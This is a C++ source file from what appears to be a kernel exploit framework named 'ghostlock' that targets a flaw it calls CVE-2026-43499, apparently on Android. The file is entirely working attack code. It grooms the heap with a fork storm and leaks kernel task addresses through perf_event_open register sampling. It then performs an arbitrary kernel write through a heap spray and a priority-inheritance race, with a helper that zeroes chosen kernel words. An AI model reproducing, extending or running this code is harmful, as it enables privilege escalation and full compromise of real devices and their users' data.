#include "backend/cve_2026_43499/primitives.hpp"

#include "memory/constants.hpp"
#include "support/native_resource.hpp"

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "kernelsnitch/utils.h"
#include "support/timing.hpp"

#include <sys/syscall.h>

#include "backend/cve_2026_43499_state.hpp"
#include "backend/cve_2026_43499/route/route_middleware.hpp"
#include "backend/cve_2026_43499/route/route_policy.hpp"
#include "memory/direct_map.hpp"
#include "support/decls.hpp"

#include <algorithm>
#include <array>
#include <atomic>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

namespace ghostlock::backend {
    void slab_drain(void) {
        /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
         * (exit 137) especially right before heap spray. */
        struct timespec up;
        clock_gettime(CLOCK_BOOTTIME, &up);
        int32_t waves = (up.tv_sec > 60) ? 2 : 1;
        int32_t batch = (up.tv_sec > 60) ? 64 : 32;
        for (int32_t wave = 0; wave < waves; wave++) {
            /* Fixed upper bound (batch <= 64): no heap and no vector exception
             * paths in this pre-attack drain. */
            std::array<support::ChildProcess, 64> drain;
            int32_t n = 0;
            for (int32_t i = 0; i < batch; i++) {
                pid_t pid = fork();
                if (pid == 0) {
                    pause();
                    _exit(0);
                }
                if (pid > 0) {
                    if (n >= static_cast<int32_t>(drain.size())) break;
                    drain[static_cast<size_t>(n++)] = support::ChildProcess(pid);
                } else {
                    break;
                }
            }
            /* kill + reap in the original order, now owned by ChildProcess */
            for (int32_t i = 0; i < n; i++) (void) drain[static_cast<size_t>(i)].terminate_and_wait(SIGKILL);
            sched_yield();
            usleep(20000);
        }
    }

    /* Find a task through perf sample records. */
    uintptr_t perf_find_task(void) {
        struct perf_event_attr pe{};
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_CPU_CLOCK;
        pe.sample_period = 5000;
        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
        pe.sample_regs_intr = (1ULL << 32) - 1;
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        pe.exclude_idle = 1;

        errno = 0;
        support::UniqueFd fd(static_cast<int32_t>(syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0)));
        if (!fd.valid()) {
            pr_warning("perf_event_open failed errno=%d\n", errno);
            return 0;
        }
        constexpr size_t kPerfPageSize = 4096;
        constexpr size_t kPerfDataPages = 32;
        constexpr size_t kPerfDataSize = kPerfPageSize * kPerfDataPages;
        const size_t msz = kPerfPageSize + kPerfDataSize;
        void *mapped = mmap(nullptr, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) {
            pr_warning("perf mmap failed errno=%d\n", errno);
            return 0;
        }
        /* Declaration order keeps the original release order: munmap (buf) runs
         * before close (fd) when this scope exits. */
        support::MappedRegion buf(mapped, msz);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        for (int32_t i = 0; i < 500000; i++) syscall(__NR_getpid);
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
        char *base = reinterpret_cast<char *>(buf.data()) + kPerfPageSize;
        uint64_t pos = hdr->data_tail;
        std::array<uintptr_t, 256> cands{};
        int32_t nc = 0;
        while (pos < head && nc < static_cast<int32_t>(cands.size())) {
            auto *ev = reinterpret_cast<struct perf_event_header *>(
                base + (pos % kPerfDataSize));
            if (ev->size == 0) break;
            if (ev->type == PERF_RECORD_SAMPLE) {
                char *p = reinterpret_cast<char *>(ev) + sizeof(*ev);
                p += 8; /* skip IP */
                uint64_t abi = *reinterpret_cast<uint64_t *>(p);
                p += 8;
                if (abi == 1 || abi == 2) {
                    uint64_t *regs = reinterpret_cast<uint64_t *>(p);
                    for (int32_t i = 0; i < 32 && nc < static_cast<int32_t>(cands.size()); i++) {
                        uint64_t v = regs[i];
                        /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
                        v |= 0x0fULL << 56;
                        if (v > memory::DIRECT_MAP_BASE && v < memory::g_direct_map_end)
                            cands[static_cast<size_t>(nc++)] = v;
                    }
                }
            }
            pos += ev->size;
        }
        hdr->data_tail = head;
        if (!nc) return 0;
        uintptr_t best = 0;
        int32_t best_cnt = 0;
        for (int32_t i = 0; i < nc; i++) {
            const auto at = cands[static_cast<size_t>(i)];
            const int32_t cnt = static_cast<int32_t>(
                std::count(cands.begin(), cands.begin() + nc, at));
            if (cnt > best_cnt) {
                best_cnt = cnt;
                best = at;
            }
        }
        pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
        return best;
    }

    /* One route write: middleware resident fast path, else heap spray + PI race.
     * Shared statement order; the middleware policy decides the resident step. */
    template <class M>
    Status Cve43499Primitives::attack_write(CoreSession &session,
                                            const memory::WriteRequest &request,
                                            const char *desc) {
        pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc,
                request.target, static_cast<int32_t>(request.mode),
                !request.preserve_child);
        if (!memory::in_direct_map(request.target)) {
            pr_warning("  target is outside the direct map, not writing\n");
            return 0;
        }

        /* Both transports write *(target) := value through the erase left-only
         * relink: waiter words are {pc = value, right = 0, left = target} and
         * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
        support::timer_mark("  heap spray start");
        (ghostlock::backend::cve43499_state(session).heap.current.base) = support::prepare_good_kernel_page(request);
        if (!(ghostlock::backend::cve43499_state(session).heap.current.base)) {
            pr_warning("  heap spray failed\n");
            return 0;
        }

        support::timer_mark("  heap spray done");
        Status routed = ghostlock::backend::cve_2026_43499::route::middleware::run_middleware_route(session, request);

        support::timer_mark("  PI route done");
        if (!routed) {
            pr_warning("  PI route did not produce a verified write\n");
        }

        return routed;
    }

    /* Ancillary-context adapter for the same write; binds the session global so
     * the attack path gains no parameter-derived call site. */
    template <class M>
    Status Cve43499Primitives::zero_word(uintptr_t target, const char *desc) {
        const memory::WriteRequest request =
                memory::WriteRequest::make(target, memory::WriteMode::Zero, 1);
        return attack_write<M>(ghostlock::session::g_exploit_session, request, desc);
    }

    /* Explicit instantiations: the catalogued route policies. Callers only
     * include the header; the definitions stay in this unit. */
    template Status Cve43499Primitives::attack_write<ghostlock::backend::cve_2026_43499::route::SelectPolicy>(
        CoreSession &, const memory::WriteRequest &, const char *);
    template Status Cve43499Primitives::attack_write<ghostlock::backend::cve_2026_43499::route::TcpPolicy>(
        CoreSession &, const memory::WriteRequest &, const char *);
    template Status Cve43499Primitives::attack_write<ghostlock::backend::cve_2026_43499::route::MulticastPolicy>(
        CoreSession &, const memory::WriteRequest &, const char *);

    template Status Cve43499Primitives::zero_word<ghostlock::backend::cve_2026_43499::route::SelectPolicy>(
        uintptr_t, const char *);
    template Status Cve43499Primitives::zero_word<ghostlock::backend::cve_2026_43499::route::TcpPolicy>(
        uintptr_t, const char *);
    template Status Cve43499Primitives::zero_word<ghostlock::backend::cve_2026_43499::route::MulticastPolicy>(
        uintptr_t, const char *);
} // namespace ghostlock::backend
